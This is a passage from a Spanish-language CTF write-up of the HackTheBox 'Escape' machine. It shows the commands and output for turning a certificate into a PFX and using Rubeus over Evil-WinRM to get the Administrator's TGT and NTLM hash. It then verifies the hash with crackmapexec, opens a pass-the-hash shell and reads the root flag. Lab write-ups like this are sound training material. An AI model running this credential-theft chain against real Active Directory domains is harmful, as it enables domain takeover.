+*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents&gt; 
+</span></code></pre></div></div>
+
+<ul>
+  <li>Ahora tenemos que guardar la <strong>key</strong> y el <strong>certificado</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nano cert.pem
+❯ nano private.key
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora vamos a seguir la instrucción de usar <strong>openssl</strong> como no lo mencionan (No es necesario poner ninguna contraseña solo dale al ENTER).</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ openssl pkcs12 <span class="nt">-in</span> cert.pem <span class="nt">-inkey</span> private.key <span class="nt">-keyex</span> <span class="nt">-CSP</span> <span class="s2">"Microsoft Enhanced Cryptographic Provider v1.0"</span> <span class="nt">-export</span> <span class="nt">-out</span> cert.pfx
+Enter Export Password:
+Verifying - Enter Export Password:
+
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora tenemos que subir el <strong>cert.pfx</strong> que nos genero y aparte tenemos que subir el <strong>Rubeus</strong> para que nos ayude a generar el hash <a href="https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe">https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe</a>.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/escape/web6.png" />
+</p>
+
+<ul>
+  <li>Así que comenzamos subiendo los 2 archivos.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\R</span>yan.Cooper<span class="se">\D</span>ocuments&gt; upload cert.pfx
+                                        
+Info: Uploading /home/miguel7/Hackthebox/Escape/content/cert.pfx to C:<span class="se">\U</span>sers<span class="se">\R</span>yan.Cooper<span class="se">\D</span>ocuments<span class="se">\c</span>ert.pfx
+                                        
+Data: 4376 bytes of 4376 bytes copied
+                                        
+Info: Upload successful!
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\R</span>yan.Cooper<span class="se">\D</span>ocuments&gt; upload Rubeus.exe
+                                        
+Info: Uploading /home/miguel7/Hackthebox/Escape/content/Rubeus.exe to C:<span class="se">\U</span>sers<span class="se">\R</span>yan.Cooper<span class="se">\D</span>ocuments<span class="se">\R</span>ubeus.exe
+                                        
+Data: 595968 bytes of 595968 bytes copied
+                                        
+Info: Upload successful!
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\R</span>yan.Cooper<span class="se">\D</span>ocuments&gt; <span class="nb">dir
+
+
+    </span>Directory: C:<span class="se">\U</span>sers<span class="se">\R</span>yan.Cooper<span class="se">\D</span>ocuments
+
+
+Mode                LastWriteTime         Length Name
+<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
+<span class="nt">-a----</span>        6/17/2023  12:15 AM           3283 cert.pfx
+<span class="nt">-a----</span>        6/16/2023  11:58 PM         174080 Certify.exe
+<span class="nt">-a----</span>        6/17/2023  12:16 AM         446976 Rubeus.exe
+<span class="nt">-a----</span>        6/16/2023  11:08 PM        2028544 winPEASx64.exe
+
+
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\R</span>yan.Cooper<span class="se">\D</span>ocuments&gt; 
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora siguiendo las instrucciones vamos a generar un <strong>TGT</strong> para obtener el <strong>hash</strong> <strong>NTLMv2</strong> del <strong>Administrator</strong> como no lo indican en los pasos.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\R</span>yan.Cooper<span class="se">\D</span>ocuments&gt; .<span class="se">\R</span>ubeus.exe asktgt /user:Administrator /certificate:cert.pfx /getcredentials
+
+   ______        _
+  <span class="o">(</span>_____ <span class="se">\ </span>     | |
+   _____<span class="o">)</span> <span class="o">)</span>_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ <span class="se">\|</span> ___ | | | |/___<span class="o">)</span>
+  | |  <span class="se">\ \|</span> |_| | |_<span class="o">)</span> <span class="o">)</span> ____| |_| |___ |
+  |_|   |_|____/|____/|_____<span class="o">)</span>____/<span class="o">(</span>___/
+
+  v2.2.0
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Action: Ask TGT
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using PKINIT with etype rc4_hmac and subject: <span class="nv">CN</span><span class="o">=</span>Ryan.Cooper, <span class="nv">CN</span><span class="o">=</span>Users, <span class="nv">DC</span><span class="o">=</span>sequel, <span class="nv">DC</span><span class="o">=</span>htb
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Building AS-REQ <span class="o">(</span>w/ PKINIT preauth<span class="o">)</span> <span class="k">for</span>: <span class="s1">'sequel.htb\Administrator'</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using domain controller: fe80::9045:a178:c6da:1141%4:88
+<span class="o">[</span>+] TGT request successful!
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="nb">base64</span><span class="o">(</span>ticket.kirbi<span class="o">)</span>:
+
+      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
+      <span class="nv">MTkzM1qoDBsKU0VRVUVMLkhUQqkfMB2gAwIBAqEWMBQbBmtyYnRndBsKc2VxdWVsLmh0Yg</span><span class="o">==</span>
+
+  ServiceName              :  krbtgt/sequel.htb
+  ServiceRealm             :  SEQUEL.HTB
+  UserName                 :  Administrator
+  UserRealm                :  SEQUEL.HTB
+  StartTime                :  6/17/2023 12:19:33 AM
+  EndTime                  :  6/17/2023 10:19:33 AM
+  RenewTill                :  6/24/2023 12:19:33 AM
+  Flags                    :  name_canonicalize, pre_authent, initial, renewable
+  KeyType                  :  rc4_hmac
+  Base64<span class="o">(</span>key<span class="o">)</span>              :  <span class="nv">IXS9XuDOHUuLF7OprYmGwA</span><span class="o">==</span>
+  ASREP <span class="o">(</span>key<span class="o">)</span>              :  2B03BE1F3BF4E7EDC5FE39E890ADA86D
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Getting credentials using U2U
+
+  CredentialInfo         :
+    Version              : 0
+    EncryptionType       : rc4_hmac
+    CredentialData       :
+      CredentialCount    : 1
+       NTLM              : A52F78E4C751E5F5E17E1E9F3E58F4EE
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\R</span>yan.Cooper<span class="se">\D</span>ocuments&gt;
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora verificamos que el <strong>Hash</strong> sea correcto para conectarnos con <code class="language-plaintext highlighter-rouge">evil-winrm</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec winrm 10.10.11.202 <span class="nt">-u</span> <span class="s1">'Administrator'</span> <span class="nt">-H</span> A52F78E4C751E5F5E17E1E9F3E58F4EE
+SMB         10.10.11.202    5985   DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:sequel.htb<span class="o">)</span>
+HTTP        10.10.11.202    5985   DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> http://10.10.11.202:5985/wsman
+WINRM       10.10.11.202    5985   DC               <span class="o">[</span>+] sequel.htb<span class="se">\A</span>dministrator:A52F78E4C751E5F5E17E1E9F3E58F4EE <span class="o">(</span>Pwn3d!<span class="o">)</span>
+</code></pre></div></div>
+
+<h2 id="shell-as-administrator">Shell as Administrator</h2>
+
+<ul>
+  <li>Ahora nos conectamos.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ evil-winrm <span class="nt">-i</span> 10.10.11.202 <span class="nt">-u</span> <span class="s1">'Administrator'</span> <span class="nt">-H</span> A52F78E4C751E5F5E17E1E9F3E58F4EE
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
+</span>sequel<span class="se">\a</span>dministrator
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; 
+</code></pre></div></div>
+
+<h2 id="root-flag">Root flag</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt; <span class="nb">type </span>root.txt
+d98d2853c8c76a576f6102e146fea568
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt; 
+</code></pre></div></div>
+
+  </div><a class="u-url" href="/hackthebox/machines/medium/2024/04/01/escape.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col">
+        <p class="feed-subscribe">
+          <a href="http://localhost:4000/feed.xml">
+            <svg class="svg-icon orange">
+              <use xlink:href="/assets/minima-social-icons.svg#rss"></use>
+            </svg><span>Subscribe</span>
+          </a>
+        </p>
+        <ul class="contact-list">
+          <li class="p-name">MiguelRega7</li>
+          
+        </ul>
+      </div>
+      <div class="footer-col">
+        <p>Posts sobre resolución de CTFs y ciberseguridad.
+</p>
+      </div>
+    </div>
+
+    <div class="social-links"><ul class="social-media-list"><li>
+  <a rel="me" href="https://github.com/MikeRega7" target="_blank" title="github">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#github"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://www.instagram.com/_darkhorse77?igsh=MWZqYTAyYnJmYWZrdg%3D%3D&utm_source=qr" target="_blank" title="instagram">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#instagram"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://www.linkedin.com/in/juan-miguel-regalado-nu%C3%B1o-a3b14b278" target="_blank" title="linkedin">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#linkedin"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://twitter.com/MiguelJmrn7" target="_blank" title="twitter">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#twitter"></use>
+    </svg>
+  </a>
+</li>
+</ul>
+</div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
